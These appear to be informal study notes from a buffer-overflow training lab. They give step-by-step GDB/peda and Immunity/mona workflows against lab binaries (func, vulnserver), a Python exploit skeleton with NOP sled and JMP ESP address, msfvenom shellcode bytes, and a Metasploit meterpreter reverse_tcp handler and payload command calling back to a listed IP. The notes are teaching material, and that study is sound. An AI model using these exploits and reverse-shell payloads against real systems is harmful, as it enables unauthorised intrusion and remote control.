BUFFER OVERFLOW COMMON TERMS

Heap- Memory that can be allocated and deallocated
Stack -A contiguous section of memory used for passing arguments
Registers -Storage elements as close as possible to the central processing unit (CPU)
Instruction Pointer (IP) -a.k.a Program Counter (PC), contains the address of next instruction to be executed
Stack Pointer (SP) -Contains the address of the next available space on the stack
Base Pointer (BP) -The base of the stack
Function -Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
Shellcode -The code that is executed once an exploit successfully takes advantage of a vulnerability

NOP SLED - a NOP sled (or "no-operation" sled") is a sequence of "no-operation" (NOP) machine instructions.

                                                                                                                                                                                    TM ON WINDOWS MONA, IMMUNITY
GDB USES
* installations of peda plugin
  git clone https://github.com/longld/peda.git ~/peda
  echo "source ~/peda/peda.py" >> ~/.gdbinit

DEMO on func.exe
strings func1 | head 
file func  -to see the file type.
DYNAMIC ANALYSIS  RUN in lINUX OPS STATION.
  ./func $(echo "12345678") #pass argument
  ./func <<<$(echo "12345678") #the gators are simulating  user input

## DISASSEMBLY
gdb ./func command
shell - bring you back to your shell or working directory.
exit - bring you back to gdb from shell
quit - break you out of gdb

IN GDB                                ##DON'T HIDE ANYTHING IN X86
  info functions
  run - to run the program 
  disass or pdisass main #pdisass only work if you have peta
      disass main
  pdisass getuserinput #getuserinput is a function    #open source research on red. do open source research oom it.
run <<<$(echo "AAA")
run <<<$(python linbuff.py)
google wiremask  https://wiremask.eu/tools/buffer-overflow-pattern-generator/
copy paste paterrn - paste it in a new offset in your code with quotes. 
run it in gdb now you looking for EIP, copy eip in the offset on the website, you should get a number.

PYTHON  SCRIPT
#!/usr/bin/env python
offset = "A" * 100    adjust the the ofset to 62   #triple single quotes help write paragraph. create multi-line strings.
print(offset)
eip = "BBBB"
offset = " paste from wiremask offset"                  TROUBLESHOOT ##RUN FILE AND THE EXECUTABLE 
print(offset+eip)
eip = "\x59\x3b\xde\xf7" switch this with the "BBBB"
nop = "\x90" * 15



#####setup GDB environment and find jmp esp addresses

#follow the exaact orer below 
>SHELl    this is done for every machine you are on.
env - gdb ./func
#Show env 
#unset env COLUMNS
#unset env LINES 
#run and ctrl+c or start
info proc map

### grab first address after heap, last address before 
0xf7de1000 0xf7ffe000   first address after heap and last address before stack
#find  /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4 
0xf7de3b59 > \x59\x3b\xde\xf7 (little indian)
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
#put the little indian in the python code eip section.

#SHELL
######msfvenom - p linux/x86/exec CMD="whoami" -b "\x00\xfe\x20\x0a\xff" -f python  
 buf =  b""
buf += b"\xbb\x7e\x25\x4c\xd7\xdb\xca\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x0b\x31\x5a\x14\x03\x5a\x14\x83\xea"
buf += b"\xfc\x9c\xd0\x26\xdc\x38\x82\xe5\x84\xd0\x99\x6a"
buf += b"\xc0\xc7\x8a\x43\xa1\x6f\x4b\xf4\x6a\x0d\x22\x6a"
buf += b"\xfc\x32\xe6\x9a\xf9\xb4\x07\x5b\x71\xdc\x68\x3a"
buf += b"\x10\x75\x77\xeb\xb9\x0c\x96\xde\xbe"


##### WINDOWS BUFFER OVERFLOW 

#Static
strings .\vulnserver.exe | select -first 10

##Behavioral
get-process | findstr /i vuln 
netstat -anop tcp | findstr /i 8148  

##run as intended

#Dyamic 
Run Immunity as Administrator > open .exe > play, rewind, repeat
fuzzing > wireshark > find offset

!mona modules #Find unprotected DLLS
!mona jmp -r esp -m "essfunc.dll"   #Search for JMP ESP with unprotected DLL
#Window > Log Data 
625011AF    \xAF\x11\x50\x62 
625011BB
625011C7

#MSF CONSOLE
msfconsole

use multi/handler
show options 
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0 
set LPORT 4444
exploit

#Shell Code
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.153.198 lport=44444 -b "\x00\xfe\x20\x0a\xff" -f python































